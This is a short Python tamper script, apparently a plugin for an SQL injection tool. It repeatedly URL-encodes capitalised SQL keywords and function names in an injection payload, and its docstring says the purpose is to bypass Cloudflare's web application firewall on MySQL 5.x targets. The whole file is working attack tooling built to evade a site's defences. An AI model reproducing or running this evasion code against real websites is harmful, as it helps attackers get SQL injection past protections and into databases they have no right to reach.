#!/usr/bin/env python
# cloudflarefunc.py
# @dualfade

import re

def tamper(payload, **kwargs):
    """
    Replaces 'MYSQL STRING FUNCTION' with encoded payload

    Tested against:
        * MySQL 5.x

    Notes:
        * Custom to bypass CloudFlare 011220221
    """

    retVal = payload

    if payload:
        for match in re.finditer(r"\b([A-Z].*?)\b", retVal):
            if len(match.group(0)) > 1:
                s = str(match.group(1))
                # urlencodeall --
                e = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in s)

                # urlencode each encoded char --
                y = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in e)
                z = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in y)
                retVal = retVal.replace(match.group(1), z)

            else:
                pass

        # ret --
        return retVal
